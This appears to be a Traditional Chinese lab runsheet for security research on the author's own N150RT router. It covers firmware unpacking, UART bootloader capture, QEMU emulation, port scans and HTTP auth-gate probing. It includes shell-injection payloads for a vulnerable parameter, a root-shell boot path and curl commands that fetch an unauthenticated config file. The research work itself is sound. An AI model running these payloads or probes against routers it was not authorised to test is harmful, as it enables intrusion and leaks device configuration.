# runsheet — 一行一行照做的作業單

> **這份檔案的目的:讓一個從來沒碰過這個專案的人,把命令複製貼上,得到可比對的輸出。**
> 它不解釋為什麼。**為什麼在 [`RUNBOOK.md`](RUNBOOK.md) —— 兩份檔案分工,不重複。**

## 先讀這 60 秒:你能重現到哪裡

**這個 repo 的一部分你重現不了,而這件事寫在這裡而不是讓你在第 40 步發現。**
這台裝置跑的 firmware **不在任何廠商下載頁上**,而它的 flash dump 帶有這一台
獨有的資料(`H601` 區的 MAC 與射頻校準)。完整的三層對照在
[`REPRODUCE.md`](REPRODUCE.md);一句話版本:

| 層 | 你需要 | 這份作業單的哪幾節 |
|---|---|---|
| **T1** | 一份 clone + 網路 | **`A1`** —— 而它包含 **205 個檢查**,一台裝置都不用 |
| **T2** | T1 + 你自己的 N150RT + 一條 CP2102(約 US$3) | `A2`–`A5`、`A12` |
| **T3** | T2 + USB 網卡 + 隔離網段 | `A6`–`A11` |

> **只做 T1 也值得。** T1 能重現的不是這個 repo 的數字,是**這個 repo 的儀器會在
> 該失敗的時候失敗** —— 95 個守衛案例的存在目的就是證明每一個拒絕是活的,
> 加上 110 個 fwrecon 測試。五分鐘,一份 clone。

## 這份檔案擁有什麼,以及誰擁有其他部分

**一份狀態一個擁有者。這份檔案擁有「確切的命令」,不擁有別的。**

| 檔案 | 擁有 |
|---|---|
| **本檔 Part A** | **確切的命令、逐字的預期輸出、停止條件、驗證步驟** ← 可編輯 |
| **本檔 Part B** | 每一週跑哪幾節、順序、本週額外步驟 ← **只追加** |
| [`RUNBOOK.md`](RUNBOOK.md) | **每一步為什麼存在**、坑的來歷、跨週推理 |
| [`BENCH-LOG.md`](BENCH-LOG.md) | 某一天**實際**打了什麼、實際看到什麼 ← 只追加 |
| [`test-cases.toml`](test-cases.toml) → [`test-ledger.md`](test-ledger.md) | 預測 / 反證條件 / 判定 / 證據 |
| [`PROGRESS.md`](PROGRESS.md) | gate、週、carried-forward |
| [`docs/disclosure.md`](docs/disclosure.md) | 每個發現的揭露狀態 |

**`make ci` 會跑 `tools/check-runsheet.py`**,它驗證本檔裡每一個 `make` 目標存在、
每一個檔案路徑存在、**每一支工具的每一個旗標真的在那支工具的 `--help` 裡**、
以及每一個 `§8.x.y` 交叉引用解析得到。**手寫可以;命令壞掉不能出貨。**

## 一個步驟長什麼樣

每一節都是同一個形狀,而**最後兩欄是這份檔案跟 RUNBOOK 的差別**:

| 欄位 | 意思 |
|---|---|
| **層** | `T1` / `T2` / `T3` —— 你手上有什麼才做得到 |
| **會不會改變裝置** | `純讀` / `改設定` / **`不可逆`**。看到 `不可逆` 就停下來讀完整節 |
| **做什麼** | 複製貼上。**`bash` / `powershell` 區塊是要跑的,`text` 區塊是預期輸出** —— 而 `make ci` 會擋掉沒有標註的區塊,因為「要跑的」和「會看到的」長得一樣是這份檔案最容易害人的地方 |
| **預期輸出** | **逐字**。你的工作是比對,不是判斷 |
| **驗證** | 一條額外的命令,把「我跑了」變成「它成功了」 |
| **❌ 停止條件** | 出現這個就**不要繼續**。這一欄是這份檔案最值錢的部分 |
| **⚠️ 坑** | 會咬你的那一件事,寫在會咬到的位置,附儀器 bug 編號 |
| **關掉的項目** | 這一節做完,**登記簿的哪幾列被關掉了** —— 見下 |
| **最後驗證** | 這一節的命令**最後一次真的被執行**是哪一天。舊的日期代表要小心 |

> **實體動作用 🔌 標記。** 那幾步腳本做不到,只有你的手做得到。

### 「關掉的項目」是一個承諾,而且它由機器維護

**[`test-ledger.md`](test-ledger.md) 裡每一個有結果的項目,都必須有一節可以走到它。**

那不是口號。`make ci` 跑的 `tools/check-runsheet.py` 雙向檢查:

1. 一節聲稱關掉的每一個編號,**必須真的在登記簿裡**(打錯字、憑空發明的編號,
   看起來跟真的覆蓋率一模一樣);
2. **登記簿裡每一個已執行的項目,必須至少被一節聲稱** —— 否則 CI 紅。
   真的沒有程序的,要寫進 `<!-- no-procedure: … -->` 區塊**並附理由**。

第二個方向才是重點。第一個方向在一份空的對應表上也會過。

> **這個檢查是作者在 2026-08-17 問出來的**:「我們不是關掉了 27 項嗎,
> 那不是應該有 27 個可以被重複執行的東西?」—— **是。而當時去量,這份檔案只提到 27 項裡的 1 項。**
> 補完之後才發現有兩節(`A1.6` `A1.7`)和一節(`A8.5`)**根本不存在**,
> 而 `A8.5` 是這個專案最強的那一條證據鏈。
> **「一個結果沒有人能走到它的程序」= 一個讀者只能相信你的主張**,而這整個 repo
> 就是為了不要那樣而排的。

---

# Part A — 程序

## A0 開工前:讓機器自己說它準備好了沒

| | |
|---|---|
| **層** | T1 / T2 / T3(各自檢查) |
| **會不會改變裝置** | 純讀,而且**完全不碰裝置** |
| **關掉的項目** | —（這一節不關掉登記簿項目） |
| **最後驗證** | 2026-08-17 |

**做什麼:**

```bash
make doctor
```

只想檢查某一層:

```bash
make doctor TIER=1
```

**預期輸出**(尾巴那一行是重點):

```text
  20 ok, 1 not applicable, 0 to fix
  ready for: whatever the tiers above allow.
```

**每一個 `FAIL` 都自帶修它的那一行命令。** 例如:

```text
  FAIL  no /dev/ttyUSB* — the serial adapter is not attached to this WSL instance
        -> PowerShell:  usbipd list  then  usbipd attach --wsl --busid <the 10c4:ea60 one>
```

> ❌ **有任何 `FAIL` 就不要往下。** 這一節存在的唯一理由,就是把「照做了但沒用」
> 變成「這一項壞了,而且這是修它的命令」。

> ⚠️ **`--` 不是 `FAIL`。** 它代表「這一層的東西你沒有,而那沒有錯」——
> 只有一份 clone 的讀者會看到 T2 / T3 全部是 `--`,那是正常的。

---

## A1 桌面側:從一份 clone 到全部報告(**不需要任何硬體**)

| | |
|---|---|
| **層** | **T1** |
| **會不會改變裝置** | 沒有裝置 |
| **關掉的項目** | —（這一節不關掉登記簿項目） |
| **最後驗證** | `ci` / `ledger` / `todo`:2026-08-17。`setup` / `fetch` / `unpack` / `recon`:2026-08-07(W01),本場未重跑 |

**這一節是整個 repo 唯一一段「clone 下來就跑得完」的部分。**

### A1.1 工具鏈

```bash
make setup
make verify
```

**預期**:`verify` 對每一支工具印一行,全部 `ok`,最後 `G0 green`。

> ⚠️ **`make setup` 之後要用登入 shell,而 `-lc` 一度不夠。**
> `binwalk` 裝在 `~/.cargo/bin`,而 PATH 的設定原本只寫進 `~/.bashrc` ——
> 那個檔案開頭有「非互動就 return」的守衛,所以 `bash -lc` 讀不到它。
> **2026-08-17 修掉了**(`setup-wsl.sh` 現在也寫進 `~/.profile`,並且自己驗一次)。
> 舊的環境跑一次 `bash tools/setup/setup-wsl.sh path` 就好。
> 從 Windows 呼叫一律用:
> ```text
> wsl -d Ubuntu-24.04 -- bash -lc 'cd /mnt/c/Users/Key20/Desktop/router && make ci'
> ```

### A1.2 韌體:抓下來,而且驗雜湊

```bash
make fetch
make unpack
```

**預期**:`fetch` 對每個檔案印 `sha256 OK`;`unpack` 印 `no symlinks in the extracted tree` 之類的結構檢查。

> ❌ **雜湊不符就停。** [`firmware/SOURCES.json`](firmware/SOURCES.json) 記錄了每一份
> 映像的來源與當時的雜湊。不符代表你拿到的不是同一個檔案,後面每一個結論都不可比。

### A1.3 報告

```bash
make recon
make check-reports
```

**預期**:`reports/` 底下的 JSON / MD 重新生成,`check-reports` 印
`reports OK — N fwrecon (schema 1.0), M Ghidra, 1 rtcase`。

### A1.4 ★ 這一節真正值得你花時間的東西

```bash
make ci
```

**預期**(尾巴):

```text
  33 passed, 0 failed        # test-rtcase.sh
  5 passed, 0 failed, 1 skipped
  15 passed, 0 failed        # test-bench-probe.sh
  7 passed, 0 failed         # test-loader-unpack.sh
  ok   local CI equivalents passed (container build not included)
```

**這 95 個守衛案例加上 110 個 fwrecon 測試,存在的目的不是證明工具會動,
是證明工具的每一個拒絕是活的。** 例如:

```bash
bash tools/test-loader-unpack.sh
```

它會建出五份**故意壞掉**的合成映像,確認解包器對每一種都拒絕、而且**拒絕的理由
是對的那一個**,最後用一份好的映像當正對照組。**一個只會拒絕的工具跟一個永遠
拒絕的工具,在只有負面案例的測試裡長得一模一樣。**

### A1.5 登記簿

```bash
make todo WEEK=W05
make ledger
```

**預期**:

```text
W05: 27/27 done, 0 outstanding
wrote test-ledger.md - 130 cases, 34 executed
```

---

## A1.6 從 dump 做的靜態判定 —— **不用接線,而它省掉一次開機**

| | |
|---|---|
| **層** | **T2**(要一份 dump,但**不用把裝置接起來**) |
| **會不會改變裝置** | 沒有碰裝置 |
| **關掉的項目** | `P9-1` |
| **最後驗證** | 2026-08-17 |

**這一節示範一件值得學的事:一個「裝置測試」有時候在桌面上就答完了,而且答得更好。**

`P9-1` 問的是「bootloader 能不能傳 `init=/bin/sh` 給 kernel」。直覺是接線、搶
bootloader、試著改 cmdline —— 一次完整的開機循環。**但那個問題在 dump 裡就有答案。**

### A1.6.1 bootloader 的第二階段

```bash
make loader-report
```

**預期**:

```text
reports/bootloader-unit-2018.json: stage 2 56,592 bytes, 328 strings, 0 cmdline hits
```

**`0 cmdline hits` 是這一節的結論**,而它的可信度來自同一行的另一半:
工具在**找不到 `?` 印的全部 17 個指令時會拒絕出報告**。所以那個 `0` 有對照組。

想自己看那 56,592 bytes 裡有什麼:

```bash
python3 tools/loader-unpack.py "$HOME/fwre-work/dumps/flash-n150rt-console-1.bin" --strings | less
```

> 🔴 **為什麼要解壓:整顆 4 MiB 裡 `grep FLR` 找不到東西。** `grep IPCONFIG`
> 也找不到,`grep "COMMAND MODE HELP"` 也找不到 —— 而那三個字每天都在 console 上。
> 原因是 `0x000000`–`0x0012F0` 只是第一階段(DRAM 訓練),
> **`0x0012F0` 起是一段 LZMA,17,334 → 56,592 bytes**,指令直譯器整個在裡面。
>
> **這個坑值得記住的形狀是**:一個 `grep` 找不到東西,可以是「不在那裡」,
> 也可以是「你在找一個壓縮過的東西」。這個 repo 用了三週的後者去支撐前者。

> ⚠️ **不要用 `--no-control` 之類的方式繞過拒絕。** 這份報告的頭號結果是一個
> **「不存在」**,而一個宣稱「這裡沒有 X」的報告,如果不能在同一次執行裡證明
> 自己找得到已知存在的東西,那個宣稱值零。

### A1.6.2 kernel 自己說它用什麼 cmdline

```bash
python3 - <<'PY'
import lzma, re, struct
from pathlib import Path
buf = Path.home().joinpath("fwre-work/dumps/flash-n150rt-console-1.bin").read_bytes()
# cr6c header is 16 bytes at 0x060000; the payload is a decompressor stub then LZMA.
pay = buf[0x060010:0x060010 + 0x0f1002]
hits = []
for off in range(0, 0x8000):
    if pay[off] != 0x5D:
        continue
    ds = struct.unpack_from("<I", pay, off + 1)[0]
    sz = struct.unpack_from("<Q", pay, off + 5)[0]
    if ds and not (ds & (ds - 1)) and (1 << 16) <= sz <= (1 << 25):
        hits.append((off, sz))
assert len(hits) == 1, f"expected exactly one LZMA stream, found {hits}"
off, sz = hits[0]
out = lzma.LZMADecompressor(format=lzma.FORMAT_ALONE).decompress(pay[off:])
assert len(out) == sz, f"declared {sz}, got {len(out)}"
print(f"kernel: LZMA at payload+0x{off:x}, {len(out):,} bytes, declared size MATCHES")
for n in (b"Linux version", b"swapper", b"Kernel command line"):
    print(f"  control {n.decode():<22} "
          f"{'present' if n in out else 'ABSENT'}")
for m in re.finditer(rb"[\x20-\x7e]{6,}", out):
    s = m.group().decode()
    if re.search(r"(console=|root=/dev|init=)", s):
        print(f"  0x{m.start():06x}  {s}")
PY
```

**預期**:

```text
kernel: LZMA at payload+0x2808, 3,374,772 bytes, declared size MATCHES
  control Linux version          present
  control swapper                present
  control Kernel command line    ABSENT
  0x2d8590  No init found.  Try passing init= option to kernel.
  0x2f9590  console=ttyS0,38400 root=/dev/mtdblock1
```

**三件事,而第三件解釋了第二件:**

1. `0x2f9590` 是**編進 kernel 的** cmdline,**沒有 `init=`**。
2. `0x2d8590` 的 `No init found.  Try passing init= option to kernel.` 說明
   **kernel 會認 `init=`** —— 缺的完全是 loader 那一側。
3. **`Kernel command line` 這個字串不在 image 裡**,所以開機 log 永遠不會印它。
   (`A10` 的腳本會為此報一行 `FAIL`,而在這台上那是預期的。)

> ✅ **`P9-1` 反證成立,而且是 `static` 證據** —— 登記簿為它宣告的 `exit_evidence`
> 就是 `static`,所以這個等級是可採信的。三個獨立儀器:loader 的字串空間、
> kernel 的 `.rodata`、以及裝置 console 的 `?`(`A3`)。**沒有共用程式碼。**

> 💡 **仍然存在的路徑,而它零 flash 寫入**:`AUTOBURN 0` → `LOADADDR` →
> TFTP 一份改過 cmdline 的 kernel 進 RAM → `J`。成本是要能重壓一份 kernel
> (那 38 個字元的字串沒有多餘空間放 ` init=/bin/sh`,得先確認後面有沒有留白)。
> **排 W07 之後,不是這一節的事。**

---

## A1.7 模擬環境:這台自己的 binary,跑在 x86 上

| | |
|---|---|
| **層** | **T2**(要一份 dump 與 root;**不用裝置**) |
| **會不會改變裝置** | 沒有碰裝置。**但它會改 dump 的副本** —— 見下 |
| **關掉的項目** | `P3-0`、`P3-6` |
| **最後驗證** | 2026-08-17 |

**大家說 Realtek SDK 模擬不起來,理由通常是 Lexra 指令集 —— 那個理由是錯的。**
真正卡住的是 `libapmib` 要讀 `/dev/mtdblock0`,而它用 `lseek`+`read` 讀,
**所以解法是提供一個檔案**,而那個檔案就是你在 `A5`/`A3` 讀出來的 dump。

```bash
make qemu-env      # 需要 sudo
make qemu-test
```

**預期**(`qemu-env` 的正對照組是三個值,不是一個):

```text
  control ok: TELNET_ENABLED=0
  control ok: IP_ADDR=10.1.1.1
  control ok: USER_NAME="admin"
  MIB lines from the vendor binary: 2317
  positive control passed
```

> 🔴 **為什麼對照組是三個值而不是一個。** 一個布林值、一個位址、一個字串 ——
> 三種不同的解碼路徑。只驗一個布林,解碼器把整張表讀歪了也會過。

**在裡面跑一次寫入,並且看它改了 flash 的哪幾個 byte:**

```bash
sudo bash tools/qemu-env.sh diff HW_WLAN0_WSC_PIN 87654321
```

**預期**:

```text
  3 bytes changed
    0x00648a  0x39 -> 0x31
    0x00648b  0x39 -> 0x00
    0x006493  0x0d -> 0x4e   <- H601 checksum
  checksum: delta 65, expected 65 -> balances
```

> 🔴 **`0x006493` 是 `H601` 區的 8-bit checksum,而「delta 與預期相符」是這一測
> 真正的產出** —— 它不是「我改了一個值」,是**「我知道這個區塊的完整性是怎麼算的」**。

> ⚠️ **復原檔案不等於復原狀態(儀器 bug 13)。** `flash`、`boa`、`sysconf` 把 MIB
> 表快取在 **System V 共享記憶體**裡,那屬於 host kernel,活得比每一個 guest process 久。
> 只改 `HW_WLAN0_REG_DOMAIN` 的一次執行,diff 裡出現了**上一次測試的** WPS PIN
> 七個 byte。**`qemu-env.sh reset` 必須同時清檔案和 shm,而那是兩件看起來像一件的事。**

> ❌ **`boa` 在這裡服務不了請求,而那不是設定錯誤。** 它死在
> `libapmib.so+0x27dc` 的 `sh s7,0(s8)` —— 一個 16-bit 對齊陷阱,標準 MIPS I 編碼
> (opcode `0x29`,手算過)。裝置的 kernel 會修它,`qemu-user` 沒有 guest kernel 可以修。
> **換 CPU model 沒有用。** 所以 HTTP 那幾輪只能在真機上做(`A8`)。

> ⚠️ **在這裡驗 payload 的引號與跳脫,不要在真機上現想。**
> 這台的 BusyBox 1.13.4 只編了 48 個 applet,**`id` 不是其中一個** ——
> `…;id > /var/web/x.txt;#` 會建出一個空檔案,而那跟「參數被過濾掉」看起來一模一樣。
> `cat /etc/version` 才是對的 payload:輸出同時證明執行成功並指出 build。

---

## A2 🔌 把 USB 裝置交給 WSL

| | |
|---|---|
| **層** | T2(序列)/ T3(再加網卡) |
| **會不會改變裝置** | 純讀 |
| **關掉的項目** | —（這一節不關掉登記簿項目） |
| **最後驗證** | 2026-08-17 |

**Windows PowerShell**(第一次要系統管理員,之後不用):

```powershell
usbipd list
```

**預期**——找出這兩行,記下 `BUSID`:

```text
BUSID  VID:PID    DEVICE                                          STATE
1-1    10c4:ea60  Silicon Labs CP210x USB to UART Bridge (COM3)    Not shared
2-4    0bda:8153  Realtek USB GbE Family Controller                Not shared
```

第一次:

```powershell
usbipd bind --busid 1-1
usbipd bind --busid 2-4
```

每次:

```powershell
usbipd attach --wsl --busid 1-1
usbipd attach --wsl --busid 2-4
```

**驗證**(WSL):

```bash
ls -l /dev/ttyUSB0
ip -br link | grep '^enx'
```

**預期**:

```text
crw-rw---- 1 root dialout 188, 0 ... /dev/ttyUSB0
enxfc19286184c9  DOWN  fc:19:28:61:84:c9 <BROADCAST,MULTICAST>
```

> 🔴 **網卡一定要交給 WSL,而且理由不只是方便。** 如果它留在 Windows 側,
> Windows 會從這台路由器拿到 DHCP 位址,而你的網路可能整個被它接走。
> 更糟的是**測試會看起來正常**:`ping` 會通,而唯一的破綻是 `ttl=63` 不是 64。
> 那是 `PROGRESS.md` 的儀器 bug 21,2026-08-17 實際發生過。

> ⚠️ **`attach` 綁在 WSL 這個 VM 上,VM 一停裝置就退回 Windows。**
> 另開一個視窗貼這一行然後不要關:
> ```powershell
> wsl -d Ubuntu-24.04 -- sleep 14400
> ```

**做完想還給 Windows:**

```powershell
usbipd detach --busid 1-1
usbipd detach --busid 2-4
```

---

## A3 🔌 抓 bootloader

| | |
|---|---|
| **層** | T2 |
| **會不會改變裝置** | 純讀 |
| **關掉的項目** | `P0-2` |
| **最後驗證** | 2026-08-17(當天成功兩次、失敗一次,失敗原因見下) |

**接線,用眼睛檢查**(電源還沒插):

- [ ] 網路線插在 **LAN** 埠(有數字標號那幾個),**WAN 埠什麼都沒插**
- [ ] CP2102 接 UART 排針的 **pin 2 / 3 / 4**,pin 1 是絲印**三角形**那一端
- [ ] **pin 1 的 `VCC` 不要接** —— 板子自己有電,接了會對打
- [ ] CP2102 的 `RX` → 板子 `TX`(pin 2);CP2102 的 `TX` → 板子 `RX`(pin 3);`GND` → `GND`(pin 4)
- [ ] **不要按 reset 鍵** —— 它會用出廠預設蓋掉現行設定
- [ ] **電源還沒插**

**做什麼**(先跑這個,**然後**才插電):

```bash
cd /mnt/c/Users/Key20/Desktop/router
python3 -u tools/console-dump.py catch --port /dev/ttyUSB0 --window 300 -v
```

**看到這一行才 🔌 插電:**

```text
  streaming ESC.  >>> POWER THE ROUTER ON NOW <<<
```

**預期輸出:**

```text
  ok    <RealTek> - the boot loader is ours
        ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
  ok    input buffer drained (the ESC stream leaves ESCs queued)
  >>>   ?
  ok    command set:
        ----------------- COMMAND MODE HELP ------------------
        HELP (?)                            : Print this help message
        DB <Address> <Len>
        ...
        <RealTek>
```

> ⚠️ **搶 bootloader 是「連續送 ESC」,它只吃一個,其餘全排在輸入緩衝區裡。**
> 所以**搶到之後第一條手打的指令必定回 `Unknown command !`**。
> 工具的 `settle()` 會先送一個裸 `\r` 清掉;手打的話先按一次 Enter。
> (儀器 bug 7)

> ❌ **`the board booted past the interrupt window` → 板子沒有真的斷電過。**
> 2026-08-17 踩過:板子當時在跑 Linux,`catch` 抓到的是執行中的 console 對 ESC
> 的回應。**先確實拔掉電源、停 2 秒、再重跑這一節。**

> ❌ **`nothing came back at all` → TX/RX 接反、port 錯、或板子沒上電。**

> ⚠️ **抓不到不要重試超過三次。** 每一次都是一次完整開機。

---

## A4 🔌 網段:把網路卡設好,並且**證明**是直連

| | |
|---|---|
| **層** | T3 |
| **會不會改變裝置** | 純讀 |
| **關掉的項目** | `P1-1` |
| **最後驗證** | 2026-08-17 |

```bash
IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
echo "iface = $IF"
sudo ip link set "$IF" up
sleep 3
sudo ip addr flush dev "$IF"
sudo ip addr add 10.1.1.100/24 dev "$IF"
ip -br addr show "$IF"
ip route get 10.1.1.1
cat "/sys/class/net/$IF/statistics/rx_packets"
```

**預期**:

```text
iface = enxfc19286184c9
enxfc19286184c9  UNKNOWN  10.1.1.100/24
10.1.1.1 dev enxfc19286184c9 src 10.1.1.100 uid 1000
0
```

> 🔴 **`ip route get` 那一行是這一步唯一的對照組。**
> 要看到 `dev enx…`,**不可以有 `via`**。出現 `via 172.18.128.1 dev eth0`
> 代表網卡還在 Windows 側,你是繞過去的 —— 而在那個狀態下:隔離做不了、
> SSDP 一定失敗得像「服務沒開」、兩個來源 IP 會被 NAT 成同一個、`nmap -sS/-sU` 不可信。

> ❌ **`iface = ` 是空的 → 網卡沒有交給 WSL。** 回 `A2`。

> ⚠️ `rx_packets` 現在是 `0` 是正常的 —— 它是 `A6` 的對照組基準。

---

## A5 🔌 64 KiB 設定區快照 + IoC 預檢

| | |
|---|---|
| **層** | T2 |
| **會不會改變裝置** | **純讀**(`FLR` + `DB`,不寫一個 byte) |
| **前置** | 板子停在 `<RealTek>`(`A3`) |
| **關掉的項目** | `P0-10` · `P0-5` |
| **最後驗證** | 2026-08-17 |

**這一節每次動手前都跑,而且它便宜到沒有藉口不做** —— 64 KiB 約 2 分鐘,
完整的 4 MiB 是 105 分鐘。`0x6000` 的 `H601`、`0x8000` 的 `COMPDS`、
`0xC000` 的 `COMPCS` 全在裡面。

```bash
SNAP="$HOME/fwre-work/dumps/config-region-$(date +%Y%m%d-%H%M)-pre.bin"
python3 -u tools/console-dump.py dump --at-prompt \
        --flash 0x0 --length 0x10000 --ram 0x81000000 --chunk 16384 \
        -o "$SNAP"
cmp <(head -c 65536 "$HOME/fwre-work/dumps/flash-n150rt-console-1.bin") "$SNAP" \
  && echo "IDENTICAL"
```

**預期**:

```text
  ==>   FLR flash 0x000000 +0x10000 -> RAM 0x81000000
     65536/65536 bytes  100.0%     691 B/s  eta   0.0 min
  ok    1 of 1 re-read chunks identical
  ok    65536 bytes -> .../config-region-…-pre.bin
  ok    4 chunks, 0 needed a re-read, 2.0 min
IDENTICAL
```

**IoC 預檢**(把上面那份快照的兩個設定區解出來比):

```bash
tools/ioc-precheck.sh "$SNAP"
```

**預期**:

```text
COMPCS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344
COMPDS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344

common entries: 343
differing     : 4  -> CHECK_SSID_OK · DHCP_LEASE_TIME · MIB_VER · WLAN_SSIDS
```

> 🔴 **這台在 2026-08-17 之後不再是 4 / 343。**
> 那天的 POST 輪(`A9`)把出廠預設區覆蓋成現行設定,所以現在是 **0 / 343**。
> **看到不是 4 就當資安事件處理是錯的** —— 先讀 `BENCH-LOG.md` 那一場的
> 「POST 之後的快照,以及歸因」。真正的成功條件是「**跟上一場收工時記下的數字相同**」。

> ❌ **出現一筆你的紀錄裡沒有的差異 → 停,走事件處理程序。**
> 這個型號在公開的殭屍網路工具裡被點名過。

> ⚠️ **有 `.partial` 沒有 `.bin` = 有一塊重讀三次都沒過。** 那要查,不要繞過。

---

## A6 🔌 隔離確認 —— 而且要帶對照組

| | |
|---|---|
| **層** | T3 |
| **會不會改變裝置** | 純讀 |
| **關掉的項目** | `P0-4` |
| **最後驗證** | 2026-08-17 |

```bash
IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
PCAP="$HOME/fwre-work/dumps/lab-$(date +%Y%m%d-%H%M).pcap"
sudo tcpdump -ni "$IF" -w "$PCAP" & TD=$!
sleep 1
ping -c 3 -i 0.3 10.1.1.1 >/dev/null
curl -s -o /dev/null http://10.1.1.1/
sleep 12
sudo kill "$TD"
tshark -r "$PCAP" 2>/dev/null | wc -l
tshark -r "$PCAP" -T fields -e eth.src 2>/dev/null | sort | uniq -c
tshark -r "$PCAP" -Y dns 2>/dev/null | head
```

**預期**:

```text
16
      8 <你的網卡 MAC>
      8 <裝置 MAC>
```
DNS 那一行**必須是空的**。

> 🔴 **「抓到零個封包」不是證據。** 2026-08-17 第一次抓 45 秒得到零,
> 差點寫成「網段乾淨」—— 而那一刻 kernel 的計數器是 `RX: 0 / TX: 12`:
> **送得出去、收不回來**。所以這一節**主動製造已知流量**,
> 而「封包數 > 0」就是那次擷取的對照組。
>
> 懷疑鏈路時用一個不共用程式碼的第二來源:
> ```bash
> cat "/sys/class/net/$IF/statistics/rx_packets"
> ```

> ❌ **剛好兩個 MAC 以外的任何結果 → 網段上有第三個東西。停。**

---

## A7 🔌 埠與服務偵察

| | |
|---|---|
| **層** | T3 |
| **會不會改變裝置** | 純讀 |
| **關掉的項目** | `P1-2` · `P6-11` · `P1-10` |
| **最後驗證** | 2026-08-17(上午場) |

```bash
D="$HOME/fwre-work/dumps"
curl -s -o /dev/null -m 4 -w 'before: %{http_code}\n' http://10.1.1.1/
sudo nmap -sS -p- --reason -T3 --max-retries 2 -oA "$D/tcp" 10.1.1.1
curl -s -o /dev/null -m 4 -w 'after tcp: %{http_code}\n' http://10.1.1.1/
sudo nmap -sU -p 53,67,69,123,161,162,1900,5353,5555 --reason -T3 -oA "$D/udp" 10.1.1.1
curl -s -o /dev/null -m 4 -w 'after udp: %{http_code}\n' http://10.1.1.1/
```

**這台已知的答案(2026-08-17)**:

```text
80/tcp     open
52869/tcp  open        <- miniigd, UPnP SOAP
52881/tcp  open        <- wscd, WPS
Not shown: 65532 closed tcp ports (reset)
53/udp · 67/udp · 1900/udp  open|filtered
```

> ⚠️ **不要 `-T4`。** 這是 400 MHz MIPS、32 MiB RAM。

> 🔴 **掃描前後各確認一次 web 還活著,而那三行 `curl` 就是為此。**
> 一次把 `boa` 打掛的掃描,結果看起來會跟「埠都關著」一模一樣。

> 🔴 **服務的 banner 不等於它的 codebase。** 這台的 UPnP 送
> `Server: miniupnpd/1.4`,而 rootfs 裡**只有 `/bin/miniigd`、沒有 `mini_upnpd`** ——
> 那個 banner 字串就在 `miniigd` 自己的字串表裡。**只讀 banner 會查錯一整組 CVE。**

---

## A8 🔌 HTTP 那幾輪 —— 用工具,不要手打

| | |
|---|---|
| **層** | T3 |
| **會不會改變裝置** | **純讀**(全部是 GET;POST 在 `A9`) |
| **關掉的項目** | `P1-3` · `P1-5` · `P1-8` · `P2-1` · `P2-2` · `P2-3` · `P2-4` · `P2-5` · `P3-13` |
| **最後驗證** | 2026-08-17 |

```bash
D="$HOME/fwre-work/dumps"
python3 tools/bench-probe.py control     --host 10.1.1.1
python3 tools/bench-probe.py fingerprint --host 10.1.1.1 -o "$D/fingerprint.json"
python3 tools/bench-probe.py gate        --host 10.1.1.1 -o "$D/gate.json"
python3 tools/bench-probe.py writes      --host 10.1.1.1 -o "$D/writes.json"
python3 tools/bench-probe.py endpoints   --host 10.1.1.1 -o "$D/endpoints-get.json"
python3 tools/bench-probe.py ssdp        --host 10.1.1.1 -o "$D/ssdp.json"
```

**預期**(`control`):

```text
   200  control                                  408B  Boa/0.94.14rc21
  route: 10.1.1.1 is directly attached on enxfc19286184c9
```

**閘門的指紋,記住這四行,它們是判讀一切的基準:**

```text
不存在的 .htm,不含豁免子字串   302 → login.htm    門跑了,擋掉
不存在的 .htm,含豁免子字串     404                門沒跑,落到檔案層
/boafrm/formX                   302 → home.htm     門沒跑(GET 走不到 handleForm)
/boafrm/formX.htm               302 → login.htm    門跑了
```

> 🔴 **測繞過的時候,目標必須是真的被擋的頁面。**
> 2026-08-17 第一輪把十三種變形全打在 `/status.htm` 上,
> 而**它在豁免清單上、本來就回 200** —— 等於拿沒鎖的門測開鎖技巧。
> 真的被擋的:`/password.htm`、`/tcpiplan.htm`、`/upload.htm`。

> ⚠️ **`endpoints` 預設 GET,而 GET 在這個 build 上分不出端點存在與否**
> —— 全部回 302/131B。要分辨必須 POST,那是 `A9`。

---

## A8.5 🔌 ★ `GET /config.dat` —— 一條四層都指得出來的證據鏈

| | |
|---|---|
| **層** | T3(取檔)+ T2(比對 flash) |
| **會不會改變裝置** | **純讀** |
| **前置** | `A4` 網段;`A5` 或 `A3` 讀出來的 dump |
| **關掉的項目** | `P10-1` |
| **最後驗證** | 2026-08-17 |

**這一節是這個專案最值得單獨講的一個結果,而它只有三行命令。**

一個**未認證**的 `GET /config.dat` 拿回 7,490 bytes,而那 7,490 bytes 的 SHA-256
**跟你用 bootloader 從 SPI flash `0xC000` 讀出來的那 7,490 bytes 完全相同**。

### A8.5.1 取檔(未認證)

```bash
D="$HOME/fwre-work/dumps"
curl -s -D "$D/config-dat.headers" -o "$D/config-dat.bin" http://10.1.1.1/config.dat
head -3 "$D/config-dat.headers"
printf 'bytes: %s\n' "$(stat -c %s "$D/config-dat.bin")"
head -c 6 "$D/config-dat.bin"; echo
```

**預期**:

```text
HTTP/1.1 200 OK
Date: ...
Server: Boa/0.94.14rc21
bytes: 7490
COMPCS
```

> 🔴 **注意這裡沒有任何憑證。** `/config.dat` 的路徑裡沒有 `.htm` 也沒有 `.asp`,
> 所以授權閘門**根本不跑**(`A8` 的指紋那四行)。而 `boa` 在**啟動時就建立**這個檔案 ——
> 不需要任何人 POST 任何東西:
>
> ```text
> 401 lseek(3,49152,SEEK_SET) = 49152        <- 0xC000, COMPCS
> 401 read(3,0x490018,7490) = 7490
> 401 open("/web/config.dat",O_RDWR|O_CREAT|O_TRUNC) = 3
> ```
>
> (那三行是 `A1.7` 的模擬環境用 `-strace` 抓到的。)**所以這條鏈比這個 repo
> 原本假設的短一步。**

### A8.5.2 跟 flash 比,而這一步是整節的重點

```bash
D="$HOME/fwre-work/dumps"
echo "served :  $(sha256sum "$D/config-dat.bin" | cut -c1-32)"
echo "flash  :  $(dd if="$D/flash-n150rt-console-1.bin" bs=1 skip=49152 count=7490 \
                  status=none | sha256sum | cut -c1-32)"
cmp <(dd if="$D/flash-n150rt-console-1.bin" bs=1 skip=49152 count=7490 status=none) \
    "$D/config-dat.bin" && echo "IDENTICAL"
```

**預期**(前 32 個字元一致,而 `cmp` 是真正的判據):

```text
served :  e09cbf8428aa15944ed75939e79820c5
flash  :  e09cbf8428aa15944ed75939e79820c5
IDENTICAL
```

> 🔴 **`49152` 就是 `0xC000`,而它是十進位** —— `dd` 的 `skip` 不吃 `0x`。
